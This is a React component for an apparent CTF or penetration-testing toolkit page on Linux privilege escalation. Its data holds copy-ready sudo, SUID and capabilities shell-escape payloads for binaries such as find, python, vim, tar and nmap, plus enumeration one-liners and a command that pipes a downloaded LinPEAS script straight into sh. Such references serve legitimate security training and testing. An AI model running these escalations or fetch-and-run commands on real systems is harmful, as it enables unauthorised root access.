import React, { useState, useMemo } from 'react';
import { Shield, Terminal, Search, Zap, FileText } from 'lucide-react';
import { CopyButton } from '../../CopyButtons';
import { ToolPageHeader, SectionCard, CommandListSection, TipsSection } from '../ui';

// ─── Types ───────────────────────────────────────────────────────
interface BinaryExploit {
    bin: string;
    description: string;
    sudo?: string;
    suid?: string;
    capabilities?: string;
}

// ─── GTFOBins Database (Curated for CTFs) ─────────────────────────
const BINARIES: BinaryExploit[] = [
    {
        bin: 'find',
        description: 'Execute commands via -exec flag.',
        sudo: 'sudo find . -exec /bin/sh \\; -quit',
        suid: '/usr/bin/find . -exec /bin/sh -p \\; -quit'
    },
    {
        bin: 'bash',
        description: 'Drop into a privileged shell.',
        sudo: 'sudo bash',
        suid: '/usr/bin/bash -p'
    },
    {
        bin: 'python',
        description: 'Spawn shell via os module.',
        sudo: 'sudo python -c \'import os; os.system("/bin/sh")\'',
        suid: '/usr/bin/python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
        capabilities: '/usr/bin/python -c \'import os; os.setuid(0); os.system("/bin/sh")\''
    },
    {
        bin: 'vim',
        description: 'Escape to shell from within the editor.',
        sudo: 'sudo vim -c \':/bin/sh\'',
        suid: '/usr/bin/vim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\''
    },
    {
        bin: 'awk',
        description: 'Run system commands within an awk block.',
        sudo: 'sudo awk \'BEGIN {system("/bin/sh")}\'',
        suid: '/usr/bin/awk \'BEGIN {system("/bin/sh")}\''
    },
    {
        bin: 'less',
        description: 'Invoke shell from pager using !',
        sudo: 'sudo less /etc/profile\n# Type !/bin/sh inside less',
        suid: '/usr/bin/less /etc/profile\n# Type !/bin/sh inside less'
    },
    {
        bin: 'nmap',
        description: 'Interactive mode (older versions) or NSE scripts.',
        sudo: 'echo "os.execute(\'/bin/sh\')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse',
        suid: 'nmap --interactive\n# Type !sh inside nmap'
    },
    {
        bin: 'tar',
        description: 'Execute arbitrary commands during archive extraction.',
        sudo: 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
        suid: '/usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'
    }
];

// ─── Quick Enum Commands ─────────────────────────────────────────
const ENUM_CMDS = [
    { label: 'Find SUID Binaries', cmd: 'find / -perm -4000 -type f 2>/dev/null', note: 'Standard SUID search' },
    { label: 'Find SGID Binaries', cmd: 'find / -perm -2000 -type f 2>/dev/null', note: 'Standard SGID search' },
    { label: 'Check Sudo Permissions', cmd: 'sudo -l', note: 'List allowed sudo commands for current user' },
    { label: 'Check Capabilities', cmd: 'getcap -r / 2>/dev/null', note: 'Look for cap_setuid (often missed by SUID scans)' },
    { label: 'LinPEAS (In-Memory)', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', note: 'Automated enum script' }
];

const TIPS = [
    'Always start by checking `sudo -l`. If you have sudo rights without a password, check GTFOBins.',
    'If a binary has SUID set but drops privileges (like bash does without -p), make sure you use the -p flag.',
    'Don\'t forget to check for Capabilities (`getcap -r /`). `tar` or `python` with `cap_setuid` is an instant root.',
    'If you find a custom SUID binary, you might need to reverse engineer it or look for Path Hijacking/Shared Library Hijacking opportunities.',
];

// ─── Component ────────────────────────────────────────────────────
export default function LinuxSUID() {
    const [searchQuery, setSearchQuery] = useState('');

    // Filter binaries based on search query
    const filteredBinaries = useMemo(() => {
        if (!searchQuery.trim()) return BINARIES;
        return BINARIES.filter(b => b.bin.toLowerCase().includes(searchQuery.toLowerCase()));
    }, [searchQuery]);

    return (
        <div className="space-y-6">
            <ToolPageHeader
                icon={Shield}
                title="Linux"
                highlight="PrivEsc"
                subtitle="ENUMERATION & GTFOBINS_PAYLOADS"
                color="yellow"
            />

            {/* ── Quick Enum Commands ── */}
            <CommandListSection
                title="Quick Enumeration One-Liners"
                icon={Search}
                commands={ENUM_CMDS}
                color="yellow"
                defaultOpen
            />

            {/* ── GTFOBins Search & Payloads ── */}
            <SectionCard>
                <div className="flex items-center justify-between flex-wrap gap-4">
                    <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
                        <Terminal className="w-3.5 h-3.5 text-yellow-400" />
                        Binary Exploitation (GTFOBins)
                    </h4>
                    <div className="relative w-full sm:w-64">
                        <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-slate-500" />
                        <input
                            type="text"
                            value={searchQuery}
                            onChange={e => setSearchQuery(e.target.value)}
                            placeholder="Search binary (e.g. bash, find)..."
                            className="w-full bg-slate-900/70 border border-slate-700/60 rounded-xl pl-9 pr-4 py-2 text-xs font-mono text-slate-200 placeholder-slate-600 focus:outline-none focus:border-yellow-500/50 focus:shadow-[0_0_15px_-4px_rgba(234,179,8,0.2)] transition-all"
                        />
                    </div>
                </div>

                {filteredBinaries.length === 0 ? (
                    <div className="text-center py-8 border border-dashed border-slate-700/50 rounded-xl">
                        <p className="text-xs font-mono text-slate-500">No matching binaries found.</p>
                    </div>
                ) : (
                    <div className="grid grid-cols-1 gap-4">
                        {filteredBinaries.map((item) => (
                            <div key={item.bin} className="bg-[#0b0f19] border border-slate-800/60 rounded-xl overflow-hidden group/bin transition-colors hover:border-yellow-500/20">
                                {/* Binary Header */}
                                <div className="bg-slate-900/80 px-4 py-3 border-b border-slate-800/60 flex items-center justify-between">
                                    <div className="flex items-center gap-2">
                                        <FileText className="w-4 h-4 text-slate-500" />
                                        <span className="text-sm font-bold font-mono text-yellow-400">{item.bin}</span>
                                    </div>
                                    <span className="text-[10px] text-slate-500 font-mono hidden sm:block">{item.description}</span>
                                </div>

                                {/* Payload Variants */}
                                <div className="p-4 space-y-3">
                                    {item.sudo && (
                                        <div>
                                            <div className="flex items-center justify-between mb-1">
                                                <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest flex items-center gap-1.5">
                                                    <Zap className="w-3 h-3 text-red-400" /> Sudo
                                                </span>
                                                <CopyButton text={item.sudo} />
                                            </div>
                                            <pre className="bg-slate-950 border border-slate-800/50 rounded-lg p-3 text-[11px] font-mono text-slate-300 whitespace-pre-wrap leading-relaxed">
                                                {item.sudo}
                                            </pre>
                                        </div>
                                    )}

                                    {item.suid && (
                                        <div>
                                            <div className="flex items-center justify-between mb-1 mt-2">
                                                <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest flex items-center gap-1.5">
                                                    <Shield className="w-3 h-3 text-yellow-400" /> SUID
                                                </span>
                                                <CopyButton text={item.suid} />
                                            </div>
                                            <pre className="bg-slate-950 border border-slate-800/50 rounded-lg p-3 text-[11px] font-mono text-slate-300 whitespace-pre-wrap leading-relaxed">
                                                {item.suid}
                                            </pre>
                                        </div>
                                    )}

                                    {item.capabilities && (
                                        <div>
                                            <div className="flex items-center justify-between mb-1 mt-2">
                                                <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest flex items-center gap-1.5">
                                                    <Shield className="w-3 h-3 text-purple-400" /> Capabilities
                                                </span>
                                                <CopyButton text={item.capabilities} />
                                            </div>
                                            <pre className="bg-slate-950 border border-slate-800/50 rounded-lg p-3 text-[11px] font-mono text-slate-300 whitespace-pre-wrap leading-relaxed">
                                                {item.capabilities}
                                            </pre>
                                        </div>
                                    )}
                                </div>
                            </div>
                        ))}
                    </div>
                )}
            </SectionCard>

            {/* ── Tips ── */}
            <TipsSection title="PrivEsc Checklists & Tips" tips={TIPS} color="yellow" className="mb-6" />
        </div>
    );
}